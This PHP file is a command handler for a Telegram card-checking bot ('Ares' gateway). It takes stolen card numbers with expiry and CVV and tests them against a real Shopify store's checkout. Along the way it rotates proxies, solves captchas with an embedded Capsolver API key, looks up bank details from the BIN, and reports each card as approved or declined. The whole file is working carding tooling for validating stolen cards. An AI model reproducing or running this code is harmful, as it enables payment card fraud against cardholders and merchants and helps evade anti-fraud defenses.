<?php
list($cmd) = explode(" ", $message);
if($cmd == "/00" or $cmd == ".00" or $cmd == "!00"){  
    $NameGater ='Ares';
$gateway = "/ar $NameGater";

Contador($gateway);
is_credits();
deleteprm($userId);
Dcred($userId);
deltecred($userId);
is_gateroff($NameGater); //off Gater
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>$NameGater
Format: <code>cc|m|y|cvv</code></b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

AntiScript();
is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];


$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>ϟ CHECKING YOUR CARD
[ 🝂 WAIT A FEW SECONDS 🟥 ]
Gateway » $NameGater
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

$rotate = rotate();
$socks5 = socks5();

$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');

$curl = ShopifyIa('https://checkout-au.allkinds.com',"$cc|$mes|$ano|$cvv", $solver);
$resp = GetStr($curl, '<p class="notice__text">', '</p>');

$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}
bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>ϟ CHECKING YOUR CARD
[ ALMOST FINISHED 🟩 ]
Gateway » Ares
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
antisppre($gId);

$res_live = array(
'Address not Verified - Approved',
'Address not Verified - Insufficient Funds',
'Security codes does not match correct format (3-4 digits)',
'Transaction Normal - Insufficient Funds',
'Your order is confirmed'
);

if(in_array($resp,$res_live)){
$status = "Approved! 🟩";
$response = "$result2 🟩";
restarCredito($userId);
}elseif(substr_count($result, 'Thank you for your purchase!') or substr_count($result, 'You’ll receive a confirmation email with your order number shortly.') or substr_count($result, 'Thank you! -') or substr_count($result, 'You can find your order number in the receipt you received via email.')){
$status = "Approved! 🟩";
$response = "Your order is confirmed🟩";
restarCredito($userId);
}elseif(substr_count($curl, 'CVC Declined')){
$status = "Approved! 🟩";
$response = $resp;
restarCredito($userId);
}elseif(substr_count($curl, 'Not enough balance')){
$status = "Approved! 🟩";
$response = $resp;
restarCredito($userId);
}elseif(substr_count($curl, 'Uptade Shopify Dead')){
$status = "Unknown Error #FRAUD! ";
$response = "Uptade Shopify Dead";
}elseif(substr_count($curl, 'Shopify Fallando')){
$status = "Unknown Error #FRAUD! ";
$response = "Shopify Fallando";
}elseif(substr_count($curl, 'No se encontró el producto')){
$status = "Unknown Error #FRAUD! ";
$response = "No se encontró el producto";
}else{
$status = "[ DECLINED 🔴 ]";
$response = "$resp";
}
 
   
   
bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>Card - 🝂 <code>$cc|$mes|$ano|$cvv</code> 
Status - 🝂 $status
Response - 🝂 $response 
Gateway - 🝂 $NameGater
──────────────────────
Bin - 🝂 <code>$brand</code> - <code>$scheme</code> - <code>$type</code> 
Bank - 🝂 <code>$bank </code> 
Country - 🝂 <code>$country </code>$emoji 
──────────────────────
Time in Progress - 🝂 $tiempo s
@RitaaChk_Bot
Checked by: <a href='tg://user?id=$userId'>$username</a>[$Rank]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


}
?>


